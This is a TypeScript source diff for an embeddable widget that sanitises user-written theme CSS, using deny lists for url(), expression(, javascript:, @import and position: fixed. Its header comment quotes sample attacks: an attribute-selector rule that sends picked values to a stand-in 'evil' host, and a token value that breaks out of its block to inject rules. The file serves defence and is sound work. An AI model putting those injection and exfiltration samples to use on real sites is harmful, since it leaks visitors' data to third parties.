@@ -1,0 +1,267 @@
+/**
+ * Theme CSS safety (2026-11 audit).
+ *
+ * Quest themes are written by qaid project members and served by qaid's
+ * server, and this embed draws them on partner sites. A theme may restyle the
+ * quest card; it must not reach the partner page or its visitors. Three holes
+ * this closes:
+ *
+ *  1. Exfiltration. `[value^="a"] { background: url(https://evil/?a) }` sends
+ *     what a visitor picks to someone else's server, and any `url()` is a
+ *     tracking pixel on every page view.
+ *  2. Page takeover. `:host { position: fixed; inset: 0 }` covers the whole
+ *     partner page with something that looks like it.
+ *  3. Breakout. A token value of `red; } :host { ... ` ends the token block
+ *     and starts rules of its own.
+ *
+ * qaid.dev applies the SAME rules when a theme is saved; keep the two lists in
+ * step. They are explicit on purpose, so both sides can be read side by side.
+ *
+ * TOKEN VALUES (theme `tokens`, and host `colors` / `fontFamily`) are dropped
+ * unless they are a plain CSS value. A value is refused if it contains any of:
+ *   - the characters  ;  {  }  <  >  \
+ *   - the text  url(  image-set(  image(  cross-fade(  src(  expression(
+ *     @import  /*  javascript:   (any case)
+ *   - unbalanced quotes, parentheses or brackets
+ * A token NAME must be a custom property: --[A-Za-z0-9_-]+
+ *
+ * THEME CSS (theme `css`) is parsed and rebuilt, so its braces always balance
+ * and it cannot swallow the layers after it. While rebuilding, this is dropped:
+ *   - comments, and every  -->  and every  <  followed by a letter, / ! or ?
+ *     (so no  </style  <script  <!--  survives; `width < 600px` does)
+ *   - every @import, @charset and @namespace rule
+ *   - a declaration whose property is  behavior  or  -moz-binding
+ *   - a declaration whose value has  url(  (except url(#id), a same-document
+ *     SVG reference),  image-set(  -webkit-image-set(  image(  cross-fade(
+ *     src(  expression(  or  javascript:
+ *   - a declaration  position: fixed  or  position: sticky
+ * CSS escapes (\75 rl, u\72l) are decoded before any check, so an escaped
+ * word is caught like a plain one.
+ *
+ * The host page's own `css` option is the partner's code and is not filtered.
+ */
+
+const TOKEN_NAME = /^--[A-Za-z0-9_-]+$/;
+const TOKEN_BAD_CHARS = /[;{}<>\\]/;
+const TOKEN_BAD_TEXT =
+  /url\(|image-set\(|(?:^|[^a-z0-9-])image\(|cross-fade\(|(?:^|[^a-z0-9-])src\(|expression\(|@import|\/\*|javascript:/i;
+
+/** Quotes, parentheses and brackets all close, in order. */
+function balanced(value: string): boolean {
+  const stack: string[] = [];
+  let quote: string | null = null;
+  for (const ch of value) {
+    if (quote) {
+      if (ch === quote) quote = null;
+      continue;
+    }
+    if (ch === '"' || ch === "'") quote = ch;
+    else if (ch === "(") stack.push(")");
+    else if (ch === "[") stack.push("]");
+    else if (ch === ")" || ch === "]") {
+      if (stack.pop() !== ch) return false;
+    }
+  }
+  return quote === null && stack.length === 0;
+}
+
+/** True when `value` is a plain CSS value safe to drop into a declaration. */
+export function isSafeTokenValue(value: unknown): value is string {
+  if (typeof value !== "string") return false;
+  if (TOKEN_BAD_CHARS.test(value)) return false;
+  if (TOKEN_BAD_TEXT.test(value.replace(/\s+/g, ""))) return false;
+  return balanced(value);
+}
+
+export function isSafeTokenName(name: string): boolean {
+  return TOKEN_NAME.test(name);
+}
+
+/** The theme's tokens as a `:where(.qaid-q-root) { ... }` block, unsafe ones dropped. */
+export function tokensToCss(tokens: Record<string, unknown> | null | undefined): string {
+  if (!tokens) return "";
+  const body = Object.entries(tokens)
+    .filter(([k, v]) => isSafeTokenName(k) && isSafeTokenValue(v) && v.trim() !== "")
+    .map(([k, v]) => `  ${k}: ${(v as string).trim()};`)
+    .join("\n");
+  return body ? `:where(.qaid-q-root) {\n${body}\n}` : "";
+}
+
+// ---------------------------------------------------------------------------
+// Theme CSS: parse into rules and declarations, rebuild what passes.
+// ---------------------------------------------------------------------------
+
+/** Decode CSS escapes (`\75` → `u`, `\:` → `:`) so a check sees the real word. */
+function unescapeCss(s: string): string {
+  return s.replace(/\\([0-9a-fA-F]{1,6})\s?|\\([^\n0-9a-fA-F])|\\\n/g, (_m, hex, ch) => {
+    if (hex) {
+      const cp = parseInt(hex, 16);
+      return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : "�";
+    }
+    return ch ?? "";
+  });
+}
+
+const DROPPED_AT_RULES = new Set(["import", "charset", "namespace"]);
+const BAD_PROPERTIES = new Set(["behavior", "-moz-binding"]);
+const BAD_VALUE =
+  /image-set\(|(?:^|[^a-z0-9-])image\(|cross-fade\(|(?:^|[^a-z0-9-])src\(|expression\(|javascript:/;
+
+function isSafeDeclaration(name: string, value: string): boolean {
+  const prop = unescapeCss(name).trim().toLowerCase();
+  const val = unescapeCss(value).toLowerCase().replace(/\s+/g, "");
+  if (BAD_PROPERTIES.has(prop) || prop.endsWith("behavior")) return false;
+  if (BAD_VALUE.test(val)) return false;
+  // url(#id) points into the same document (an SVG filter or marker); every
+  // other url() loads something from somewhere.
+  for (const m of val.matchAll(/url\(\s*(['"]?)(.)/g)) {
+    if (m[2] !== "#") return false;
+  }
+  if (prop === "position" && /^(fixed|sticky)/.test(val)) return false;
+  return true;
+}
+
+/**
+ * Scan from `i` to the first top-level `;`, `{` or `}` (outside strings and
+ * parentheses). Returns the index of that character, or `css.length`.
+ */
+function scanTo(css: string, i: number): number {
+  let depth = 0;
+  let quote: string | null = null;
+  for (; i < css.length; i++) {
+    const ch = css[i];
+    if (quote) {
+      if (ch === "\\") i++;
+      else if (ch === quote || ch === "\n") quote = null;
+      continue;
+    }
+    if (ch === "\\") {
+      i++;
+      continue;
+    }
+    if (ch === '"' || ch === "'") quote = ch;
+    else if (ch === "(" || ch === "[") depth++;
+    else if ((ch === ")" || ch === "]") && depth > 0) depth--;
+    else if (depth === 0 && (ch === ";" || ch === "{" || ch === "}")) return i;
+  }
+  return i;
+}
+
+interface Parsed {
+  out: string;
+  end: number;
+}
+
+/**
+ * Parse a list of items (rules at the top level; declarations and nested
+ * rules inside a block) until a closing `}` or the end. `inBlock` decides
+ * whether a `name: value;` item is a declaration.
+ */
+function parseItems(css: string, start: number, inBlock: boolean): Parsed {
+  const parts: string[] = [];
+  // A statement: an at-rule ending in `;`, or (inside a block) a declaration.
+  const statement = (head: string): void => {
+    if (!head) return;
+    const at = /^@([-\w\\]+)/.exec(head);
+    if (at) {
+      // Statement at-rules: only @layer (an ordering list) is kept; this is
+      // where @import, @charset and @namespace go.
+      if (unescapeCss(at[1]).toLowerCase() === "layer") parts.push(`${head};`);
+      return;
+    }
+    if (!inBlock) return;
+    const colon = head.indexOf(":");
+    if (colon <= 0) return;
+    const name = head.slice(0, colon);
+    const value = head.slice(colon + 1);
+    if (isSafeDeclaration(name, value)) parts.push(`  ${name.trim()}: ${value.trim()};`);
+  };
+
+  let i = start;
+  while (i < css.length) {
+    const stop = scanTo(css, i);
+    const head = css.slice(i, stop).trim();
+    const ch = css[stop];
+    if (ch === "{") {
+      const inner = parseItems(css, stop + 1, true);
+      i = inner.end;
+      const at = /^@([-\w\\]+)/.exec(head);
+      if (at && DROPPED_AT_RULES.has(unescapeCss(at[1]).toLowerCase())) continue;
+      if (head) parts.push(`${head} {\n${inner.out}\n}`);
+      continue;
+    }
+    // `;`, `}` or the end of input: whatever came before is a statement.
+    statement(head);
+    i = stop + 1;
+    // `}` ends this block. At the top level a stray `}` is just skipped.
+    if (ch === "}" && inBlock) return { out: parts.join("\n"), end: i };
+  }
+  return { out: parts.join("\n"), end: css.length };
+}
+
+/** Rebuild a theme's custom CSS with every unsafe part removed. */
+export function sanitizeThemeCss(css: unknown): string {
+  if (typeof css !== "string" || css.trim() === "") return "";
+  let text = css.replace(/\/\*[\s\S]*?(?:\*\/|$)/g, " ");
+  // Nothing in a rebuilt stylesheet may close or open an HTML context, even
+  // where it is only text, in case it is ever serialised into markup.
+  let prev: string;
+  do {
+    prev = text;
+    // `<` before a letter, `/`, `!` or `?` opens a tag or comment in HTML;
+    // CSS itself only uses `<` in media ranges (`width < 600px`).
+    text = text.replace(/<(?=[A-Za-z/!?])|-->/g, " ");
+  } while (text !== prev);
+  return parseItems(text, 0, false).out.trim();
+}
+
+// ---------------------------------------------------------------------------
+// Installing the stylesheet
+// ---------------------------------------------------------------------------
+
+/**
+ * Put `css` into the shadow root. A constructed stylesheet is used where the
+ * browser has them (no HTML parse at all, and it is not blocked by a
+ * partner's `style-src` CSP); otherwise a `<style>` whose textContent is set.
+ * The `<style>` carries `data-qaid-q-theme`; a sheet is remembered in a WeakMap.
+ */
+/** Each installed theme sheet, with the source text it was built from. */
+const themeSheets = new WeakMap<CSSStyleSheet, string>();
+
+export function installThemeCss(root: ShadowRoot, css: string): void {
+  const canAdopt =
+    typeof CSSStyleSheet === "function" &&
+    typeof CSSStyleSheet.prototype.replaceSync === "function" &&
+    Array.isArray((root as { adoptedStyleSheets?: unknown }).adoptedStyleSheets);
+  if (canAdopt) {
+    try {
+      const sheet = new CSSStyleSheet();
+      sheet.replaceSync(css);
+      themeSheets.set(sheet, css);
+      root.adoptedStyleSheets = [...root.adoptedStyleSheets, sheet];
+      return;
+    } catch {
+      // fall through to a <style>
+    }
+  }
+  const style = document.createElement("style");
+  style.setAttribute("data-qaid-q-theme", "");
+  style.textContent = css;
+  root.appendChild(style);
+}
+
+/** The theme stylesheets this module installed in `root` (for tests and teardown). */
+export function themeSheetsIn(root: ShadowRoot): CSSStyleSheet[] {
+  const adopted = (root as { adoptedStyleSheets?: CSSStyleSheet[] }).adoptedStyleSheets ?? [];
+  return adopted.filter((s) => themeSheets.has(s));
+}
+
+/** The theme CSS installed in `root` as text, or null when none was. */
+export function themeCssText(root: ShadowRoot): string | null {
+  const sheets = themeSheetsIn(root);
+  if (sheets.length > 0) {
+    return sheets.map((s) => themeSheets.get(s) ?? "").join("\n");
+  }
+  const style = root.querySelector("style[data-qaid-q-theme]");
+  return style ? (style.textContent ?? "") : null;
+}
